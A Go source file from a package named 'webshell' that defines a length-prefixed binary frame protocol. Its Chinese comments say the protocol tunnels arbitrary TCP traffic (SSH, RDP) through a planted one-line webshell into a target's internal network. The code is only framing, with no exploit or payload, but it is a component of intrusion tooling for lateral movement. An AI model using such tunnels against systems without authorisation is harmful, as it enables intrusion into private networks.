package webshell

// 帧协议：平台 ⇄ 目标端隧道脚本，跑在一条 HTTP 长连接的 body 上。
//
// 帧格式（二进制安全，定长头 + 变长体）：
//
//	[4 字节大端长度 N][1 字节类型 T][N 字节 payload]
//
// 一条长连接 = 一个 TCP channel。平台在请求体里写帧，在响应体里读帧；
// 目标端脚本反过来。这样一句话马（无状态、一请求一响应）也能撑起任意 TCP
// 隧道：真正的 socket 由目标端脚本在它那一次 HTTP 请求的生命周期里持有。
//
// 为什么不用文本协议（换行分隔）：DATA 帧是任意二进制（SSH/RDP/TLS），
// base64 一遍会让吞吐减半且每次都要分配新缓冲。定长头零拷贝解析最省。

import (
	"encoding/binary"
	"fmt"
	"io"
)

const (
	frameOpen   byte = 0x01 // 平台→目标：payload = "host:port"，建到内网目标的 TCP 连接
	frameStatus byte = 0x02 // 目标→平台：payload[0] = 0 成功 / 1 失败，其余为文本说明
	frameData   byte = 0x03 // 双向：payload = 原始数据块
	frameEOF    byte = 0x04 // 双向：本方向不再有数据（半关）
	frameClose  byte = 0x05 // 双向：整个 channel 结束，释放目标端 socket
	framePing   byte = 0x06 // 平台→目标：保活探测
	framePong   byte = 0x07 // 目标→平台：保活应答
)

const (
	frameHeaderSize  = 5
	maxFramePayload  = 64 * 1024 // 与 socket 读块一致；超过说明对端出错
	maxStatusPayload = 4 * 1024
)

// writeFrame 写一帧。调用方保证 w 不会被并发写（channel 的请求体由单一 writer goroutine 持有）。
func writeFrame(w io.Writer, typ byte, payload []byte) error {
	if len(payload) > maxFramePayload {
		return fmt.Errorf("帧 payload %d 字节超过上限 %d", len(payload), maxFramePayload)
	}
	var head [frameHeaderSize]byte
	binary.BigEndian.PutUint32(head[:4], uint32(len(payload)))
	head[4] = typ
	if _, err := w.Write(head[:]); err != nil {
		return err
	}
	if len(payload) > 0 {
		_, err := w.Write(payload)
		return err
	}
	return nil
}

// readFrame 读一帧。io.ReadFull 保证读满定长头，避免半包被当成完整帧。
func readFrame(r io.Reader) (byte, []byte, error) {
	var head [frameHeaderSize]byte
	if _, err := io.ReadFull(r, head[:]); err != nil {
		return 0, nil, err
	}
	n := binary.BigEndian.Uint32(head[:4])
	if n > maxFramePayload {
		return 0, nil, fmt.Errorf("帧长度 %d 超过上限 %d（对端不兼容或数据损坏）", n, maxFramePayload)
	}
	typ := head[4]
	payload := make([]byte, int(n))
	if n > 0 {
		if _, err := io.ReadFull(r, payload); err != nil {
			return 0, nil, err
		}
	}
	return typ, payload, nil
}

// statusOK / statusErr 构造 STATUS 帧的 payload。
func statusOK() []byte { return []byte{0} }

func statusErr(msg string) []byte {
	if len(msg) > maxStatusPayload {
		msg = msg[:maxStatusPayload]
	}
	out := make([]byte, 0, len(msg)+1)
	out = append(out, 1)
	return append(out, msg...)
}

// parseStatus 解析 STATUS payload，返回 (成功?, 说明)。
func parseStatus(p []byte) (bool, string) {
	if len(p) == 0 {
		return false, "STATUS 帧为空"
	}
	if p[0] == 0 {
		return true, ""
	}
	return false, string(p[1:])
}
